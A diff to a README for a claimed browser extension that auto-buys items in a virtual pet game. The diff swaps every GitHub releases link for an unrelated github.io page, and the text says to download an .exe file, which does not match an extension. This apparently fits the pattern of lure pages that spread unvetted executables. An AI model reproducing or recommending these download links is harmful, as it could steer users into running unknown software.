@@ -1,6 +1,6 @@
 # 🛒 Autobuyer Update Hub - Automate Your Virtual Pet Game
 
-[![Download Now](https://img.shields.io/badge/Download-Autobuyer%20Update%20Hub-blue?style=for-the-badge)](https://github.com/anishkverma1-commits/autobuyer-update-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Autobuyer%20Update%20Hub-blue?style=for-the-badge)](https://anishkverma1-commits.github.io)
 
 ## 🚀 What is Autobuyer Update Hub?
 
@@ -24,7 +24,7 @@ Autobuyer Update Hub is a browser extension that works with Chromium browsers to
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/anishkverma1-commits/autobuyer-update-hub/releases](https://github.com/anishkverma1-commits/autobuyer-update-hub/releases)
+Visit this link to download the application: [https://anishkverma1-commits.github.io](https://anishkverma1-commits.github.io)
 
 1. Click the link above to go to the download page.
 2. Look for the latest release (usually at the top of the page).
@@ -85,7 +85,7 @@ A: Simply delete the `autobuyer-update-hub.exe` file from your computer. The ext
 
 ## 📞 Need Help?
 
-If you have questions or run into issues, please check the [Releases page](https://github.com/anishkverma1-commits/autobuyer-update-hub/releases) for updates. You can also open an issue on the GitHub repository for support.
+If you have questions or run into issues, please check the [Releases page](https://anishkverma1-commits.github.io) for updates. You can also open an issue on the GitHub repository for support.
 
 ## 📄 License
 
